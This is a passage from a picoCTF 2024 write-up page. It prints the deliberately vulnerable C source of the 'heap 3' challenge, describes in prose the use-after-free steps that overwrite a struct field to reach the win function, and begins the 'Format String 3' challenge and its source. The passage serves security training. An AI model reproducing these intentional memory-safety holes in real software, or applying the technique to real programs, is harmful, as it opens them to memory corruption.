style=\"color:#22863A;--shiki-dark:#ECC48D\">Data for flag: \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    scanf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%s\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> alloc)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> free_memory\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    free\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(x)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> print_heap\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">[*]   Address   ->   Value   \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">+-------------+-----------+\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">[*]   \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%p\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">  ->   \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%s\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> x\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">->\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">flag\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> x\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">->\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">flag\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">+-------------+-----------+\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> main\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Setup\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    init\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    int\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> choice;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">    while\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">        print_menu\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">()\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">\tif\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">scanf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%d\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\"> &#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">choice)\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> !=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) \u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">exit\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        switch\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (choice) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        case\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> print heap\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            print_heap\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            break\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        case\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 2\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            alloc_object\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            break\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        case\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> print x\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            printf\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">x = \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%s\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> x\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">-\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">>\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D7DBE0\">flag\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            fflush\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(stdout);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            break\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        case\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 4\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Check for win condition\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            check_win\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            break\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        case\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 5\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            free_memory\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            break\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        case\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 6\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">            //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> exit\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">            return\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">        default\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            printf\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Invalid choice\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">            fflush\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(stdout);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Let’s see what goes on in the code. So our objective is to get to the \u003Ccode>check_win()\u003C/code> function. However, this can only be achieved if the variable \u003Ccode>x\u003C/code> equals to \u003Ccode>pico\u003C/code>, and \u003Ccode>x\u003C/code> has been set to \u003Ccode>bico\u003C/code>.\u003C/p>\n\u003Cp>We also see other cases, such as \u003Ccode>print_heap\u003C/code>, \u003Ccode>alloc_object()\u003C/code> and \u003Ccode>free_memory()\u003C/code>. Let’s try to think of a solution.\u003C/p>\n\u003Cp>Further up we can see a struct being created.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">typedef\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> struct\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> b\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> c\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> flag\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">5\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">we have to modify this \"area\" from bico to pico\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">} object;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This struct and the functions \u003Ccode>alloc_object()\u003C/code> and \u003Ccode>free_memory()\u003C/code> will allow us to change \u003Ccode>x\u003C/code> to \u003Ccode>pico\u003C/code>!\u003C/p>\n\u003Cp>Here’s our steps:\u003C/p>\n\u003Col>\n\u003Cli>Allocate memory of size 35 (size of struct) with random garbage.\u003C/li>\n\u003Cli>Free this garbage\u003C/li>\n\u003Cli>Allocate memory of size 35 with random garbage but overflow with the last 5 characters being \u003Ccode>pico\u003C/code> and the null byte\u003C/li>\n\u003Cli>Somehow this confused the program and it will use those last 5 bytes as x.\u003C/li>\n\u003C/ol>\n\u003Cp>Let’s see this in action:\u003C/p>\n\u003Cp>\u003Cimg src=\"/img/writeups/2024/picoCTF2024/heap3.png\" alt=\"Image of exploit success\">\u003C/p>\n\u003Cp>Wow! So simple!\u003C/p>\n\u003Ch3 id=\"format-string-3\">Format String 3\u003C/h3>\n\u003Cblockquote>\n\u003Cp>This program doesn’t contain a win function. How can you win?\u003C/p>\n\u003Cp>Download the binary here.\u003C/p>\n\u003Cp>Download the source here.\u003C/p>\n\u003Cp>Download libc here, download the interpreter here.\u003C/p>\n\u003Cp>Run the binary with these two files present in the same directory.\u003C/p>\n\u003Cp>Additional details will be available after launching your challenge instance.\u003C/p>\n\u003C/blockquote>\n\u003Cp>This one’s pretty simple because it basically is format string 2, just a little bit more complicated.\u003C/p>\n\u003Cp>The hint says: \u003Ccode>Is there any way to change what a function points to?\u003C/code>. This must mean we need to overwrite a function to point to something else.\u003C/p>\n\u003Cp>Let’s read the source code provided:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">#\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">include\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> &#x3C;\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">stdio.h\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">#\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">define\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> MAX_STRINGS\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 32\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">char\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\"> *\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">normal_string \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">/bin/sh\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> setup\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">\tsetvbuf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdin\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\"> NULL\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan 